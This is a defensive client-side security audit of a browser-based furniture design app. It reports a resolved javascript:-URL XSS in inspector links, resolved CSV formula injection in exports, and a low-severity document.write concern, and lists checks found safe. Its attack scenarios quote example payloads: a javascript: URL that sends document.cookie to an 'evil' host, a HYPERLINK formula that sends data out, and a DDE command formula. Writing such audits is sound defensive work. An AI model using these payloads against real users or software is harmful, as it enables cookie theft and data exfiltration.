# Client-side security review — 2026-06-19

**Scope:** defensive security audit of the browser app (no backend). Focus on the
untrusted-data ingress points: a shared design (`.sofa.json` file or `#/design/<code>`
/ `#/plans/<code>` link) that a victim opens, and user-provided free-text (item /
room / material / comment / callout / quote text, upload file names). Threats are
client-side: XSS in the app or in commonly-opened **exported** artifacts (HTML report,
drawing set, moodboard, BOQ), CSV/SVG/XML injection in exports, unsafe deserialization
(prototype pollution / NaN / `__proto__`), and unvalidated URLs in `href`/`src` sinks.

**Verdict:** the app is **largely safe**. The HTML/SVG export builders escape user
strings carefully, and the shared-design deserialization is robustly guarded (Zod
schema, NaN drop, bounded inflate, no prototype pollution — verified). Two real,
reachable issue classes remain: (1) CSV formula injection in every CSV export, and
(2) unvalidated `javascript:`/`data:` URLs in inspector links sourced from an imported
IKEA def. Both are reachable by sending a victim a crafted `.sofa.json`.

---

## Findings (ranked)

### SEC-001 — `javascript:` URL injection in inspector source/document links (XSS) — HIGH — ✅ RESOLVED (v0.1.0.38)

**Resolution:** Added a shared, unit-tested scheme allowlist sanitizer
`src/utils/safeUrl.ts` (`safeUrl`/`safeHref`/`sanitizeUrlField`) — permits only
`http:`/`https:`/`mailto:` and scheme-less relative/protocol-relative URLs after stripping
whitespace + control chars and lowercasing the scheme (so ` javascript:`, `JavaScript:`,
`java\tscript:` are all rejected); drops `javascript:`/`data:`/`vbscript:`/`file:`/any other
scheme. Applied at every def-derived render sink: `SourceLine` (`sourceUrl`), `IkeaBody`
(`documents[].url` anchors render as inert text when unsafe, `mainImageUrl` `<img src>`), and
`BudgetPanel` retailer offer links (+`rel="noopener noreferrer"`). Hardened at the trust
boundary in `src/state/schema.ts`: a Zod transform neutralizes `IkeaGltfDefZ.sourceUrl` and the
`productInfo.mainImageUrl`/`documents[].url` fields on import (set to `undefined`, import does
not throw — back-compatible). The IKEA variant `url` render sink was already protected by
`shoplist.ts:sanitizeUrl`. Tests: `src/utils/safeUrl.test.ts`, a schema-import test
(`schema.test.ts`), and a `SourceLine` inert-link test.

**Files:**
- `src/ui/inspector/SourceLine.tsx:14` — `<a href={sourceUrl} …>` (no scheme validation)
- `src/ui/inspector/InspectorPanel.tsx:513-517` — passes `def.sourceUrl` to `SourceLine` for `source === 'ikea'` defs
- `src/ui/inspector/IkeaBody.tsx:103` — `<a href={d.url} …>` for each `info.documents[]`
- `src/state/schema.ts:125` — `IkeaGltfDefZ.sourceUrl: z.string().optional()` (no URL/scheme check)
- `src/state/schema.ts:118` — `productInfo: z.record(z.string(), z.unknown())` → cast to `IkeaProductInfo`, so `info.documents[].url` is entirely unvalidated
- `src/state/schema.ts:78` — `IkeaVariantZ.url: z.string()` (unvalidated; rendered elsewhere as a product link)

**Attack scenario:** an attacker hand-edits a `.sofa.json` export (the import path keeps
`userFurniture`, including `source:'ikea'` defs — only the URL-share path strips them, see
`designShare.buildDesignSharePayload` zeroing `userFurniture`). They set a fake IKEA def's
`sourceUrl` (or a `productInfo.documents[].url`) to
`javascript:fetch('https://evil/x?'+document.cookie)` (or a `data:text/html,…` document
link). The victim imports the file, selects that item, and clicks the "Source" link (or a
"… (PDF)" document link) in the Inspector. React does **not** sanitize `href`, so the
`javascript:` URI executes in the app origin → XSS (exfiltrate localStorage/IDB designs,
tamper with the live design, etc.). `rel="noopener noreferrer"` does not mitigate a
`javascript:`/`data:` scheme.

**Suspected cause:** these defs were assumed to come only from the trusted in-app IKEA
scraper (which writes https URLs), but the same fields are accepted verbatim from an
imported design with no scheme validation in the schema or at the render sink.

**Suggested fix:** validate scheme to http/https at render (reuse the pattern already in
`src/ui/shoplist.ts:58-62` `sanitizeUrl` — drop anything not matching `^https?://`), or
validate in the Zod schema (`.url()` + a `.refine(v => /^https?:/i.test(v))`). Prefer a
shared `safeHref()` helper used by `SourceLine`, `IkeaBody`, and any other def-derived `href`.

**Test:** import a `.sofa.json` whose IKEA def has `sourceUrl:"javascript:alert(1)"`; render
`SourceLine`/`IkeaBody`; assert the anchor has no `href` (or a safe `#`) and that
`javascript:` never reaches the DOM. Unit test the new `safeHref()` against
`javascript:`, `data:text/html`, `vbscript:`, `//evil`, and a valid `https://`.

---

### SEC-002 — CSV formula injection in all CSV exports (BOQ / furniture list / shopping list) — MED — ✅ RESOLVED
**Resolution:** added a shared `csvSafeField`/`csvNumberField` helper in `src/utils/csv.ts`
(RFC-4180 quoting + OWASP formula-neutralization: a leading `= + - @` / TAB / CR — including
behind a leading `"` — is prefixed with a single quote `'`). All three builders (`boq.ts`,
`furnitureCsv.ts`, `shoppingCsv.ts`) now route every user-controlled TEXT field through it; genuine
numeric columns use `csvNumberField` so legitimate negative numbers stay numeric. Unit-tested in
`src/utils/csv.test.ts` + each exporter's test.

**Files:**
- `src/export/boq.ts:184` `csvField()` — RFC-4180 quoting only; no formula neutralization (confirms/extends prior **IO-011**)
- `src/ui/furnitureCsv.ts:12` `esc()` — same gap
- `src/ui/shoppingCsv.ts:16` `esc()` — same gap

**Source values reaching these CSVs (all attacker-controllable):** furniture `def.name`
(user-upload / IKEA def name — free text from a renamed upload or an imported design;
`schema.ts` `name: z.string()`), material/finish names, room names (`PlanRoomZ.name`),
quote-template `companyName`/`contactLine`/`headerNote`/`footerNote`
(`boqToCsv` rows in `boq.ts:203-205,252-255`).

**Attack scenario:** a victim opens a shared design (or uses an upload) whose furniture is
named `=HYPERLINK("https://evil/?l="&A1,"Open")` or `=cmd|'/c calc'!A1` (DDE), then exports
the BOQ/furniture/shopping list to CSV and opens it in Excel / LibreOffice / Google Sheets.
The leading `=`/`+`/`-`/`@`/tab/CR makes the cell an executable formula → data exfiltration
via `HYPERLINK`/`WEBSERVICE`, or command execution via legacy DDE (with the spreadsheet's
"enable content" prompt). RFC-4180 quoting does **not** neutralize this (a quoted
`"=…"` is still parsed as a formula on cell entry).

**Note (safe):** the `.xlsx` export (`src/export/boqXlsx.ts:37`) writes text as
`t="inlineStr"` inline-string cells, which Excel treats as literal data (not formulas) — so
the XLSX path is **not** affected. Only the CSV builders are.

**Suspected cause:** the CSV helpers implement RFC-4180 field quoting but were not extended
with the spreadsheet-formula-neutralization step.

**Suggested fix:** in each `csvField`/`esc`, if the value (after trimming) starts with
`= + - @` or a tab/CR, prefix it with a single quote `'` (or a leading apostrophe / zero-width
guard per the OWASP CSV-injection guidance), *then* apply RFC-4180 quoting. Centralize the
three duplicate implementations into one `csvField` so the fix lands once.

**Test:** build a BOQ/furniture/shopping CSV with a name `=1+1` and assert the emitted field
is `"'=1+1"` (neutralized) and that a normal name round-trips unchanged; cover `+`,`-`,`@`,
leading tab.

---

### SEC-003 — Quote-template free text rendered into the report-window HTML via `document.write` — LOW
**Files:** `src/ui/openBoq.ts:146-158` (writes the quote document), rendered by
`src/export/boq.ts:278` `boqToHtml` using `escapeTemplateText` (`quoteTemplate.ts:128`).

**Status:** the template fields (`companyName`, `contactLine`, header/footer notes) **are**
HTML-escaped before insertion (`escapeTemplateText` does the 5-char escape), so there is no
XSS here today. Logged as **LOW / informational** only because the data is fully
attacker-controllable (it persists in the save schema, `schema.ts:290-305`, and travels in a
shared design) and is written into a new same-origin document via `document.write`; any
future edit that interpolates a template field *without* `escapeTemplateText` (e.g. into a
`style`/attribute or a `<script>`) would become XSS. Keep all template-field insertions
routed through `escapeTemplateText`, and add a regression test for a `</script><img onerror>`
company name in `boqToHtml`.

---

## Checked and found safe

- **React text rendering.** Comments (`CommentsPanel.tsx:131,141` — `c.text`, `c.author`),
  item labels, room names, callout text are rendered as React children → auto-escaped. No
  `dangerouslySetInnerHTML` on user text in component bodies.
- **HTML export escaping.** `report.ts` (via `esc`, `reportShared.ts:61`), `moodboard.ts`
  (`escapeHtml` + `sanitizeColor`, lines 39-62), `drawingSet.ts` (`esc` on every cell +
  callout, e.g. `:140` `esc(line)`), `shoplist.ts` (`escapeHtml`, http/https URL
  re-validation `:58-62,217-219`) escape every user string in both text and attribute
  context (quotes included). Hero images are restricted to `data:image/` only
  (`report.ts:677`, `moodboard.ts:69`).
- **SVG export escaping.** `reportPlanSvg.ts:10`, `elevation/elevationSvg.ts:27`,
  `lighting2d/lightingPlanSvg.ts` use a full 5-char escape on user text placed in
  `<text>`/attributes; numeric coords go through `toFixed`. The in-app
  `dangerouslySetInnerHTML` SVG renders (`ElevationPanel.tsx:207,413`) consume these
  already-escaped strings.
- **Shared-design deserialization.** `.sofa.json` (`designFile.ts`) and link decode
  (`planShare.ts` / `designShare.ts`) all run `migrate()` → `SerializedStateZ.safeParse`.
  - **Prototype pollution: not reachable.** `migrate()` (`migrations.ts:22`) spreads own
    enumerable props (a JSON `__proto__` key is a literal own property, not the prototype
    accessor — spread copies it as data, no pollution). Zod `z.record` then **drops** any
    `__proto__` key entirely — verified empirically (a `{"__proto__":{…},"a":"b"}` record
    parsed to `["a"]` only, `Object.prototype` untouched, output prototype intact). The
    finish maps are additionally rebuilt key-by-key through a `validRoom` allow-list
    (`schema.ts:556-563`).
  - **NaN/Infinity:** items with non-finite `position`/`rotation` are filtered out before
    they can reach Three.js matrices (`schema.ts:568-573`).
  - **Zip-bomb / DoS:** bounded streaming inflate with a hard decompressed cap
    (`planShare.ts:65-87`, design link tightened to 4 MB) and a 50 MB file cap
    (`designFile.ts:20`).
  - **Version:** unknown/newer versions throw a typed error, not silently coerced
    (`migrations.ts:28-33`).
- **URL-share payload hardening.** `designShare.buildDesignSharePayload` strips
  `userFurniture`/`userMaterials` (and session noise), so the `#/design/`/`#/plans/` link
  path cannot deliver the SEC-001 IKEA-def vector — only the `.sofa.json` *file* import can.
- **XLSX export** uses inline-string cells (`boqXlsx.ts:37`) and full XML entity escaping
  (`:14`) → no formula injection, no XML injection.
- **Blob/object-URL sinks** (`designFile.ts:27`, `downloadBoq*`, `openFurnitureCsv.ts`,
  AI gallery, backdrop image) are locally generated from in-memory data, anchored to
  `a.download`, and revoked after click — not attacker-controlled.
- **No `eval` / `new Function` / `insertAdjacentHTML` / `.outerHTML` / `srcdoc`** on
  untrusted input anywhere in `src/` (the only `innerHTML` writes are `host.innerHTML=''`
  clears and test setup).
- **`window.open` / docs link** (`docsUrl.ts:8`) uses a fixed constant URL with
  `noopener,noreferrer`.
